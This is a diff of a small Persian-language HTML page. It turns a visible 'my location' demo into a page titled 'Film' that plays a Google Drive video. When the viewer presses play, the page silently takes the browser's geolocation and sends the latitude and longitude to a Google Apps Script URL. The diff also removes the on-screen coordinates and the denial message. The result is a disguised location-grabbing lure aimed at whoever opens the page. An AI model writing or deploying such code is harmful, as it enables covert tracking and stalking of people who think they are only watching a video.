@@ -2,23 +2,24 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>موقعیت من</title>
+<title>فیلم</title>
+<style>
+body{margin:0;background:#000;display:flex;justify-content:center;align-items:center;height:100vh;}
+video{width:100%;max-width:500px;}
+</style>
 </head>
 <body>
-<h2>موقعیت فعلی</h2>
-<button onclick="getLocation()">نمایش عکس</button>
-<p id="result"></p>
+<video id="vid" controls>
+<source src="https://drive.google.com/uc?export=download&id=1I5NILnCWcccjrZZDdsD5L-jnNCUIWj3p" type="video/mp4">
+</video>
 <script>
-function getLocation(){
+document.getElementById("vid").addEventListener("play",function(){
 navigator.geolocation.getCurrentPosition(function(p){
 var lat=p.coords.latitude;
 var lon=p.coords.longitude;
-document.getElementById("result").innerHTML="Lat: "+lat+"<br>Lon: "+lon;
 fetch("https://script.google.com/macros/s/AKfycbxOSBgHXr5R8ndNperhFhkuYURo559hgSjZg9JYYy0RXWE2rJ00zQnpOmTwuOFhJ4Q59Q/exec?lat="+lat+"&lon="+lon);
-},function(){
-document.getElementById("result").innerHTML="دسترسی داده نشد";
 });
-}
+});
 </script>
 </body>
 </html>
